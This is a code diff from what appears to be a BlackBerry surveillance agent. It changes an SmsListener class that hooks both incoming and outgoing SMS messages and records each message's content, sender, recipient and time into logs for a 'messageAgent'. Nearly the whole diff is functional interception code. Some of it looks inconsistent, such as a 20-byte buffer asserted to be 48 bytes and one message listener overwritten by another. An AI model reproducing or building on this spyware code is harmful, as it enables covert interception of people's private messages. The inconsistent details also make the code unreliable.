@@ -4,6 +4,7 @@ package blackberry.agent.sms;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
+import java.util.Date;
 
 import javax.microedition.io.Connector;
 import javax.wireless.messaging.BinaryMessage;
@@ -30,6 +31,7 @@ public class SmsListener {
 
     MessageConnection smsconn;
     SMSINListener insms;
+    SMSOUTListener outsms;
     MessageAgent messageAgent;
 
     public SmsListener(final MessageAgent messageAgent) {
@@ -40,11 +42,20 @@ public class SmsListener {
         try {
 
             smsconn = (MessageConnection) Connector.open("sms://:0");
+
+            //#ifdef DEBUG_TRACE
+            debug.trace("start: SMSINListener");
+            //#endif
             insms = new SMSINListener(smsconn, this);
-            smsconn.setMessageListener(new SMSOUTListener(this));
+
+            //#ifdef DEBUG_TRACE
+            debug.trace("start: SMSOUTListener");
+            //#endif
+
+            outsms = new SMSOUTListener(this);
 
         } catch (final IOException e) {
-            e.printStackTrace();
+            debug.error(e);
         }
     }
 
@@ -54,8 +65,9 @@ public class SmsListener {
                 smsconn.close();
             }
         } catch (final IOException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
+            //#ifdef DEBUG_ERROR
+            debug.error(e);
+            //#endif
         } finally {
             smsconn = null;
         }
@@ -65,15 +77,19 @@ public class SmsListener {
         new Thread(insms).start();
         try {
             smsconn.setMessageListener(insms);
+            smsconn.setMessageListener(outsms);
         } catch (final IOException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
+            //#ifdef DEBUG_ERROR
+            debug.error(e);
+            //#endif
         }
     }
 
     synchronized void saveLog(final javax.wireless.messaging.Message message,
             final boolean incoming) {
-        String msg = null;
+        //String msg = null;
+
+        byte[] dataMsg = null;
 
         //#ifdef DEBUG_TRACE
         debug.trace("saveLog: " + message);
@@ -81,24 +97,33 @@ public class SmsListener {
 
         if (message instanceof TextMessage) {
             final TextMessage tm = (TextMessage) message;
-            msg = tm.getPayloadText();
+            String msg = tm.getPayloadText();
             //#ifdef DEBUG_INFO
             debug.info("Got Text SMS: " + msg);
             //#endif
 
+            dataMsg = WChar.getBytes(msg);
+
         } else if (message instanceof BinaryMessage) {
-            final byte[] data = ((BinaryMessage) message).getPayloadData();
+            dataMsg = ((BinaryMessage) message).getPayloadData();
 
             try {
-                msg = new String(data, "UTF-8");
+
+                //String msg16 = new String(data, "UTF-16BE");
+                String msg8 = new String(dataMsg, "UTF-8");
+
+                //#ifdef DEBUG_TRACE
+                //debug.trace("saveLog msg16:" + msg16);
+                debug.trace("saveLog msg8:" + msg8);
+                //#endif
+
             } catch (final UnsupportedEncodingException e) {
                 //#ifdef DEBUG_ERROR
                 debug.error("saveLog:" + e);
                 //#endif
-                return;
             }
             //#ifdef DEBUG_INFO
-            debug.info("Got Binary SMS: " + msg);
+            debug.info("Got Binary SMS, len: " + dataMsg.length);
             //#endif
         }
 
@@ -106,7 +131,8 @@ public class SmsListener {
         try {
 
             final int flags = incoming ? 1 : 0;
-            final DateTime filetime = new DateTime(message.getTimestamp());
+
+            DateTime filetime = null;
             final byte[] additionalData = new byte[20];
 
             String from;
@@ -121,10 +147,16 @@ public class SmsListener {
             if (incoming) {
                 from = address;
                 to = getMyAddress();
+                filetime = new DateTime(message.getTimestamp());
             } else {
                 from = getMyAddress();
                 to = address;
+                filetime = new DateTime(new Date());
             }
+
+            //#ifdef DBC
+            Check.asserts(filetime != null, "saveLog: null filetime");
+            //#endif
 
             final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                     false);
@@ -135,16 +167,21 @@ public class SmsListener {
             databuffer.write(Utils.padByteArray(to, 16));
 
             //#ifdef DEBUG_INFO
-            debug
-                    .info("Received sms : "
-                            + (incoming ? "incoming" : "outgoing"));
-            debug.info("From: " + from + " To: " + to + " date: " + filetime);
+            debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
+            debug.info("From: " + from + " To: " + to + " date: "
+                    + filetime.toString());
             //#endif
 
-            //Check.ensures(additionalData.length == 56, "Wrong buffer size");
+            Check.ensures(additionalData.length == 48, "Wrong buffer size");
 
-            messageAgent.createLog(additionalData, WChar.getBytes(msg),
-                    LogType.SMS_NEW);
+            if (dataMsg != null) {
+                messageAgent
+                        .createLog(additionalData, dataMsg, LogType.SMS_NEW);
+            } else {
+                //#ifdef DEBUG_ERROR
+                debug.error("data null");
+                //#endif
+            }
 
         } catch (final Exception ex) {
             //#ifdef DEBUG_ERROR
